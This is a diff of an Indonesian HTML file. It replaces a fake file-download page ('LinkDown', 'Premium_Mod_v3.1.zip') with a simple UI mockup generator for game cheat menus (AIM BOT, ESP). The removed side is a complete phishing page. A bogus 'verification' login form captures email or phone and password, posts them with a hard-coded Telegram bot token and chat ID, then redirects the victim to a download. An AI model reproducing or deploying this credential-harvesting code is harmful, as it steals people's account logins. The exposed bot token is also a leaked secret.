@@ -1,614 +1,116 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-    <title>LinkDown · Cyber</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', 'Segoe UI', monospace; }
-        body {
-            min-height: 100vh;
-            background: #0b0b12;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            overflow-y: auto;
-            position: relative;
-        }
-
-        .bg-animation {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            pointer-events: none;
-            z-index: 0;
-            overflow: hidden;
-        }
-        .bg-animation span {
-            position: absolute;
-            color: #3a1a4a;
-            font-size: 22px;
-            font-weight: bold;
-            opacity: 0.2;
-            animation: floatUp 22s linear infinite;
-            user-select: none;
-            white-space: nowrap;
-        }
-        @keyframes floatUp {
-            0% { transform: translateY(100vh) scale(0.7); opacity: 0.05; }
-            50% { opacity: 0.3; }
-            100% { transform: translateY(-10vh) scale(1.3); opacity: 0; }
-        }
-
-        .cyber-card {
-            max-width: 860px;
-            width: 100%;
-            background: rgba(10, 8, 18, 0.78);
-            backdrop-filter: blur(16px);
-            border-radius: 32px;
-            border: 1px solid rgba(150, 50, 200, 0.35);
-            box-shadow: 0 0 50px rgba(120, 30, 180, 0.2), inset 0 0 30px rgba(100, 20, 150, 0.05);
-            padding: 0 0 28px 0;
-            position: relative;
-            z-index: 1;
-            overflow: hidden;
-        }
-
-        .cyber-topbar {
-            padding: 20px 28px;
-            border-bottom: 1px solid #1f142a;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 12px;
-        }
-        .cyber-logo {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            font-size: 28px;
-            font-weight: 800;
-            color: #b380e0;
-            text-shadow: 0 0 14px #6a2a9a;
-        }
-        .cyber-logo small {
-            font-weight: 600;
-            font-size: 16px;
-            color: #6a4a7a;
-            text-shadow: none;
-        }
-        .cyber-nav {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-            font-size: 16px;
-            font-weight: 600;
-        }
-        .cyber-nav a {
-            color: #b380e0;
-            text-decoration: none;
-            transition: 0.2s;
-            padding: 4px 0;
-            border-bottom: 1px solid transparent;
-            font-weight: 700;
-        }
-        .cyber-nav a:hover {
-            color: #d0a0f0;
-            border-bottom-color: #7a2aba;
-            text-shadow: 0 0 10px #6a2a9a;
-        }
-        .user-badge {
-            background: #140c1e;
-            border-radius: 50%;
-            width: 40px; height: 40px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-            color: #b380e0;
-            border: 1px solid #3a1a4a;
-            font-weight: 700;
-        }
-
-        .cyber-breadcrumb {
-            padding: 14px 28px 8px 28px;
-            font-size: 15px;
-            font-weight: 600;
-            color: #5a3a6a;
-            border-bottom: 1px solid #140c1e;
-        }
-        .cyber-breadcrumb span {
-            color: #b380e0;
-            font-weight: 700;
-            text-shadow: 0 0 8px #4a1a6a;
-        }
-
-        .cyber-file-section {
-            padding: 22px 28px 14px 28px;
-            display: flex;
-            gap: 28px;
-            flex-wrap: wrap;
-            align-items: flex-start;
-        }
-        .cyber-file-icon {
-            width: 100px; height: 120px;
-            background: #0e0816;
-            border-radius: 16px;
-            border: 1px solid #2a1a3a;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            font-size: 50px;
-            color: #b380e0;
-            flex-shrink: 0;
-        }
-        .cyber-file-icon small {
-            font-size: 14px;
-            color: #5a3a6a;
-            margin-top: 6px;
-            font-weight: 700;
-        }
-        .cyber-file-detail {
-            flex: 1;
-            min-width: 200px;
-        }
-        .cyber-file-detail h1 {
-            font-size: 28px;
-            font-weight: 800;
-            color: #d0b0e8;
-            margin-bottom: 6px;
-            text-shadow: 0 0 10px #3a1a5a;
-            word-break: break-word;
-        }
-        .cyber-file-detail .meta {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 18px;
-            font-size: 16px;
-            font-weight: 600;
-            color: #7a5a8a;
-            margin: 8px 0 10px 0;
-        }
-        .cyber-file-detail .meta .tag {
-            background: #140c1e;
-            color: #b380e0;
-            padding: 4px 16px;
-            border-radius: 40px;
-            font-size: 14px;
-            font-weight: 700;
-            border: 1px solid #2a1a3a;
-        }
-        .cyber-file-detail .desc {
-            font-size: 18px;
-            font-weight: 600;
-            color: #a890b0;
-            margin-top: 10px;
-            line-height: 1.6;
-        }
-        .cyber-file-detail .uploader {
-            font-size: 15px;
-            font-weight: 600;
-            color: #5a3a6a;
-            margin-top: 14px;
-            border-top: 1px solid #140c1e;
-            padding-top: 14px;
-        }
-        .cyber-file-detail .uploader a {
-            color: #b380e0;
-            font-weight: 700;
-            text-decoration: none;
-        }
-        .cyber-file-detail .uploader a:hover {
-            text-shadow: 0 0 10px #6a2a9a;
-        }
-
-        .cyber-download-area {
-            padding: 14px 28px 0 28px;
-            display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            gap: 20px;
-            border-top: 1px solid #140c1e;
-            margin-top: 12px;
-            padding-top: 18px;
-        }
-        .cyber-download-btn {
-            background: linear-gradient(145deg, #2a103a, #12081e);
-            color: #d0b0e8;
-            font-weight: 800;
-            font-size: 20px;
-            padding: 16px 48px;
-            border-radius: 60px;
-            border: 1px solid #4a1a6a;
-            cursor: pointer;
-            transition: 0.2s;
-            box-shadow: 0 0 20px rgba(80, 20, 140, 0.15);
-            display: inline-flex;
-            align-items: center;
-            gap: 12px;
-            text-shadow: 0 0 8px #4a1a6a;
-            flex: 1 1 auto;
-            justify-content: center;
-        }
-        .cyber-download-btn:hover {
-            background: linear-gradient(145deg, #3a1a5a, #1a0828);
-            box-shadow: 0 0 40px rgba(100, 30, 160, 0.3);
-            border-color: #7a2aba;
-            transform: scale(1.02);
-        }
-        .cyber-download-btn:active { transform: scale(0.97); }
-        .cyber-download-note {
-            font-size: 15px;
-            font-weight: 600;
-            color: #5a3a6a;
-        }
-        .cyber-download-note a {
-            color: #b380e0;
-            font-weight: 700;
-            text-decoration: none;
-        }
-        .cyber-download-note a:hover {
-            text-shadow: 0 0 10px #6a2a9a;
-        }
-
-        .login-overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(3, 2, 8, 0.75);
-            backdrop-filter: blur(8px);
-            justify-content: center;
-            align-items: center;
-            z-index: 999;
-            padding: 20px;
-        }
-        .login-overlay.show { display: flex; }
-        .login-box {
-            background: #0c0814;
-            max-width: 440px;
-            width: 100%;
-            border-radius: 28px;
-            padding: 40px 30px 32px;
-            border: 1px solid #3a1a4a;
-            box-shadow: 0 0 60px rgba(80, 20, 140, 0.25);
-            position: relative;
-            animation: slideUp 0.25s ease;
-        }
-        @keyframes slideUp {
-            from { transform: translateY(30px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-        .login-box .close {
-            position: absolute;
-            top: 16px; right: 22px;
-            font-size: 28px;
-            cursor: pointer;
-            color: #4a2a5a;
-            background: none;
-            border: none;
-            transition: 0.15s;
-        }
-        .login-box .close:hover { color: #b380e0; }
-        .login-box h3 {
-            font-size: 26px;
-            font-weight: 800;
-            color: #d0b0e8;
-            margin-bottom: 4px;
-            text-shadow: 0 0 12px #4a1a6a;
-        }
-        .login-box .sub {
-            font-size: 16px;
-            font-weight: 600;
-            color: #6a4a7a;
-            margin-bottom: 24px;
-        }
-        .login-box input {
-            width: 100%;
-            padding: 14px 18px;
-            border: 1px solid #1f142a;
-            border-radius: 16px;
-            font-size: 17px;
-            font-weight: 600;
-            margin-bottom: 10px;
-            outline: none;
-            transition: 0.15s;
-            background: #0e0816;
-            color: #d0b0e8;
-        }
-        .login-box input:focus {
-            border-color: #6a2a9a;
-            box-shadow: 0 0 20px rgba(80, 20, 140, 0.25);
-        }
-        .login-box input::placeholder {
-            color: #3a2a4a;
-            font-weight: 600;
-        }
-        .login-box .login-btn {
-            width: 100%;
-            background: linear-gradient(145deg, #2a103a, #12081e);
-            color: #d0b0e8;
-            font-weight: 800;
-            font-size: 18px;
-            padding: 15px;
-            border: 1px solid #4a1a6a;
-            border-radius: 60px;
-            cursor: pointer;
-            transition: 0.15s;
-            text-shadow: 0 0 8px #4a1a6a;
-            margin-top: 6px;
-        }
-        .login-box .login-btn:hover {
-            background: linear-gradient(145deg, #3a1a5a, #1a0828);
-            box-shadow: 0 0 30px rgba(80, 20, 140, 0.3);
-        }
-        .login-box .tos {
-            font-size: 14px;
-            font-weight: 600;
-            color: #3a2a4a;
-            text-align: center;
-            margin-top: 20px;
-        }
-        .login-box .tos a {
-            color: #6a3a8a;
-            font-weight: 700;
-            text-decoration: none;
-        }
-
-        .error-msg {
-            color: #ff4466;
-            font-size: 14px;
-            font-weight: 700;
-            margin-top: 6px;
-            margin-bottom: 4px;
-            display: none;
-            text-shadow: 0 0 10px #ff004466;
-            background: #1a0a0a;
-            padding: 8px 14px;
-            border-radius: 12px;
-            border-left: 4px solid #ff4466;
-        }
-        .error-msg.show {
-            display: block;
-        }
-
-        @media (max-width: 650px) {
-            .cyber-topbar { flex-direction: column; align-items: stretch; gap: 6px; }
-            .cyber-nav { justify-content: flex-end; }
-            .cyber-file-section { flex-direction: column; align-items: center; text-align: center; }
-            .cyber-file-icon { width: 80px; height: 100px; }
-            .cyber-download-area { flex-direction: column; align-items: stretch; }
-            .cyber-download-btn { justify-content: center; padding: 16px 20px; font-size: 18px; }
-            .login-box { padding: 28px 18px; }
-            .cyber-logo { font-size: 24px; }
-            .cyber-file-detail h1 { font-size: 24px; }
-            .cyber-file-detail .desc { font-size: 16px; }
-        }
-        @media (max-width: 400px) {
-            .cyber-file-detail h1 { font-size: 20px; }
-            .cyber-download-btn { font-size: 16px; padding: 14px 16px; }
-            .cyber-logo { font-size: 20px; }
-            .cyber-logo small { font-size: 13px; }
-            .cyber-file-detail .desc { font-size: 14px; }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>UI Mockup Generator</title>
+<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+<style>
+:root{--theme:#8f3dff;--bg:#0b0b0b}
+*{box-sizing:border-box;font-family:Arial,sans-serif}
+body{margin:0;background:#111;color:#fff;display:flex;gap:20px;padding:20px;flex-wrap:wrap}
+.panel{width:360px;background:#1a1a1a;padding:15px;border-radius:16px}
+input,textarea,select,button{width:100%;margin-top:6px;margin-bottom:10px;padding:10px;border-radius:10px;border:none}
+button{cursor:pointer}
+.previewWrap{flex:1;display:flex;justify-content:center}
+#card{width:450px;background:var(--bg);border:2px solid var(--theme);border-radius:24px;padding:20px;box-shadow:0 0 25px var(--theme)}
+.logo{font-size:34px;font-weight:bold;color:var(--theme)}
+.section{margin-top:20px;border:1px solid #333;border-radius:14px;overflow:hidden}
+.sectionTitle{padding:12px;background:#171717;color:var(--theme);font-weight:bold}
+.desc{padding:10px;font-size:12px;opacity:.8}
+.row{display:flex;justify-content:space-between;padding:12px;border-top:1px solid #222}
+.toggle{padding:6px 12px;border-radius:20px;font-weight:bold}
+.feature{display:flex;gap:6px}
+.feature input{flex:1}
+.feature select{width:90px}
+</style>
 </head>
 <body>
+<div class="panel">
+<h2>Generator</h2>
+<input id="title" value="FreeLock V1.0" placeholder="Nama">
+<input id="used" value="Free" placeholder="Used">
+<label>Warna Tema</label><input type="color" id="theme" value="#8f3dff">
+<label>Background</label><input type="color" id="bg" value="#0b0b0b">
 
-<!-- ===== BACKGROUND ===== -->
-<div class="bg-animation" id="bgAnim"></div>
+<input id="aimTitle" value="AIM VIP">
+<textarea id="aimDesc">Premium Features</textarea>
+<div id="aimFeatures"></div>
+<button onclick="addFeature('aimFeatures')">+ AIM Feature</button>
 
-<!-- ===== CARD ===== -->
-<div class="cyber-card">
-    <div class="cyber-topbar">
-        <div class="cyber-logo">
-            <span style="font-size:32px;">⬡</span> LinkDown <small>· cyber</small>
-        </div>
-        <div class="cyber-nav">
-            <a href="#">Sign Up</a>
-            <a href="#">Log In</a>
-            <span class="user-badge">👤</span>
-        </div>
-    </div>
+<input id="espTitle" value="ESP MENU">
+<textarea id="espDesc">Visual Features</textarea>
+<div id="espFeatures"></div>
+<button onclick="addFeature('espFeatures')">+ ESP Feature</button>
 
-    <div class="cyber-breadcrumb">
-        📁 Home / <span>Premium_Mod_v3.1.zip</span>
-    </div>
-
-    <div class="cyber-file-section">
-        <div class="cyber-file-icon">
-            📦
-            <small>ZIP</small>
-        </div>
-        <div class="cyber-file-detail">
-            <h1>Premium_Mod_v3.1.zip</h1>
-            <div class="meta">
-                <span>📏 156.8 MB</span>
-                <span class="tag">✓ Verified</span>
-                <span>🔒 Encrypted</span>
-            </div>
-            <div class="desc">
-                ⚡ Mod Premium — full features, anti-ban, latest update.
-            </div>
-            <div class="uploader">
-                👤 <a href="#">Ash_Mods</a> · 2 jam lalu · 1,284 downloads
-            </div>
-        </div>
-    </div>
-
-    <div class="cyber-download-area">
-        <button class="cyber-download-btn" id="downloadTrigger">📥 Download Now</button>
-        <div class="cyber-download-note">
-            🔒 Verifikasi · <a href="#" id="whyLogin">Kenapa?</a>
-        </div>
-    </div>
+<button onclick="renderCard()">Generate</button>
+<button onclick="downloadPNG()">Download PNG</button>
 </div>
 
-<!-- ===== LOGIN OVERLAY ===== -->
-<div class="login-overlay" id="loginOverlay">
-    <div class="login-box">
-        <button class="close" id="closeLogin">✕</button>
-        <h3>🔐 Verifikasi</h3>
-        <div class="sub">Masukkan email/nomor & sandi untuk melanjutkan</div>
-
-        <form id="loginForm" novalidate>
-            <input type="text" id="loginEmail" placeholder="Email atau nomor HP" required>
-            <input type="password" id="loginPass" placeholder="Sandi" required>
-            <div class="error-msg" id="errorMsg">⚠️ Format tidak valid.</div>
-            <button type="submit" class="login-btn">📥 Verifikasi & Download</button>
-        </form>
-
-        <div class="tos">
-            Dengan melanjutkan, Anda setuju dengan <a href="#">Syarat & Ketentuan</a>
-        </div>
-    </div>
+<div class="previewWrap">
+<div id="card"></div>
 </div>
 
 <script>
-    // ===== BG ANIMATION =====
-    (function() {
-        const container = document.getElementById('bgAnim');
-        const chars = ['0', '1', '⬡', '◈', '▣', '◆', '⬟', '⎔'];
-        for (let i = 0; i < 45; i++) {
-            const span = document.createElement('span');
-            span.textContent = chars[Math.floor(Math.random() * chars.length)];
-            span.style.left = Math.random() * 100 + '%';
-            span.style.fontSize = (18 + Math.random() * 30) + 'px';
-            span.style.animationDuration = (16 + Math.random() * 24) + 's';
-            span.style.animationDelay = (Math.random() * 25) + 's';
-            container.appendChild(span);
-        }
-    })();
+function addFeature(id,name='',status='ON'){
+ let d=document.createElement('div');
+ d.className='feature';
+ d.innerHTML=`<input value="${name}" placeholder="Feature"><select><option>ON</option><option>OFF</option></select>`;
+ d.querySelector('select').value=status;
+ document.getElementById(id).appendChild(d);
+}
+['AIM BOT','AIM FIRE','AIM SILENT'].forEach(v=>addFeature('aimFeatures',v,'ON'));
+['ESP','ESP NAME','ESP LINE'].forEach(v=>addFeature('espFeatures',v,'ON'));
 
-    // ============================================================
-    // VALIDASI SUPER KETAT
-    // ============================================================
-    const errorMsg = document.getElementById('errorMsg');
+function row(name,status){
+ let bg=status==='ON'?'var(--theme)':'#444';
+ return `<div class="row"><span>${name}</span><div class="toggle" style="background:${bg}">${status}</div></div>`;
+}
 
-    function isValidEmail(email) {
-        // Email harus: [something]@[domain].[tld] (min .com / .co.id)
-        // Dan tidak boleh ada spasi
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
-        return emailRegex.test(email);
-    }
+function renderCard(){
+ document.documentElement.style.setProperty('--theme',theme.value);
+ document.documentElement.style.setProperty('--bg',bg.value);
 
-    function isValidPhone(phone) {
-        // Hanya angka, tanpa spasi/tanda hubung, panjang 10-14 digit
-        const cleaned = phone.replace(/[\s\-\(\)]/g, '');
-        return /^\d{10,14}$/.test(cleaned);
-    }
+ let aim='';
+ document.querySelectorAll('#aimFeatures .feature').forEach(f=>{
+  let n=f.querySelector('input').value;
+  let s=f.querySelector('select').value;
+  if(n.trim()) aim+=row(n,s);
+ });
 
-    function validateInput(input) {
-        if (!input || input.length < 2) return false;
-        if (input.includes('@')) {
-            return isValidEmail(input);
-        } else {
-            return isValidPhone(input);
-        }
-    }
+ let esp='';
+ document.querySelectorAll('#espFeatures .feature').forEach(f=>{
+  let n=f.querySelector('input').value;
+  let s=f.querySelector('select').value;
+  if(n.trim()) esp+=row(n,s);
+ });
 
-    // ============================================================
-    // TELEGRAM
-    // ============================================================
-    const TELEGRAM_TOKEN = '8926031261:AAELt78bKCnWxLs0tEDwrEKU7nXJ1hyEJ9w';
-    const CHAT_ID = '7719903782';
-    const REAL_DOWNLOAD_URL = 'https://www.mediafire.com/file/abc123/ModGame.zip'; // GANTI
+ card.innerHTML=`
+ <div class="logo">${title.value}</div>
+ <div>used : ${used.value}</div>
 
-    // ============================================================
-    // ELEMEN
-    // ============================================================
-    const overlay = document.getElementById('loginOverlay');
-    const triggerBtn = document.getElementById('downloadTrigger');
-    const closeBtn = document.getElementById('closeLogin');
-    const loginForm = document.getElementById('loginForm');
-    const emailInput = document.getElementById('loginEmail');
-    const passInput = document.getElementById('loginPass');
+ <div class="section">
+  <div class="sectionTitle">${aimTitle.value}</div>
+  <div class="desc">${aimDesc.value.replace(/\n/g,'<br>')}</div>
+  ${aim}
+ </div>
 
-    function sendToTelegram(email, password) {
-        const pesan = `🔐 *New Login Data*\n\n📧 Email: ${email}\n🔑 Password: ${password}\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: pesan,
-                parse_mode: 'Markdown'
-            })
-        }).catch(() => {});
-    }
+ <div class="section">
+  <div class="sectionTitle">${espTitle.value}</div>
+  <div class="desc">${espDesc.value.replace(/\n/g,'<br>')}</div>
+  ${esp}
+ </div>`;
+}
 
-    function processLogin(email, pass) {
-        sendToTelegram(email, pass);
-        overlay.classList.remove('show');
-        triggerBtn.innerHTML = '⏳ Memproses...';
-        triggerBtn.disabled = true;
-        setTimeout(() => {
-            window.location.href = REAL_DOWNLOAD_URL;
-        }, 1500);
-    }
-
-    // ============================================================
-    // EVENT
-    // ============================================================
-    triggerBtn.addEventListener('click', () => {
-        overlay.classList.add('show');
-        errorMsg.classList.remove('show');
-        emailInput.value = '';
-        passInput.value = '';
-    });
-
-    closeBtn.addEventListener('click', () => overlay.classList.remove('show'));
-    overlay.addEventListener('click', (e) => {
-        if (e.target === overlay) overlay.classList.remove('show');
-    });
-
-    loginForm.addEventListener('submit', (e) => {
-        e.preventDefault();
-
-        const email = emailInput.value.trim();
-        const pass = passInput.value.trim();
-
-        // ===== VALIDASI KETAT =====
-        if (!email || !pass) {
-            errorMsg.textContent = '⚠️ Semua kolom wajib diisi.';
-            errorMsg.classList.add('show');
-            return;
-        }
-
-        // Cek email (jika mengandung @) atau nomor (jika tidak)
-        if (email.includes('@')) {
-            if (!isValidEmail(email)) {
-                errorMsg.textContent = '⚠️ Email tidak valid (contoh: user@gmail.com).';
-                errorMsg.classList.add('show');
-                return;
-            }
-        } else {
-            if (!isValidPhone(email)) {
-                errorMsg.textContent = '⚠️ Nomor HP harus 10-14 digit angka.';
-                errorMsg.classList.add('show');
-                return;
-            }
-        }
-
-        // Password minimal 4 karakter
-        if (pass.length < 4) {
-            errorMsg.textContent = '⚠️ Password minimal 4 karakter.';
-            errorMsg.classList.add('show');
-            return;
-        }
-
-        // ===== LOLOS VALIDASI =====
-        errorMsg.classList.remove('show');
-        processLogin(email, pass);
-    });
-
-    document.getElementById('whyLogin').addEventListener('click', (e) => {
-        e.preventDefault();
-        alert('🔐 Verifikasi untuk keamanan & mencegah akses otomatis.');
-    });
+function downloadPNG(){
+ html2canvas(document.getElementById('card'),{scale:3}).then(c=>{
+  let a=document.createElement('a');
+  a.href=c.toDataURL('image/png');
+  a.download='mockup.png';
+  a.click();
+ });
+}
+renderCard();
 </script>
 </body>
 </html>
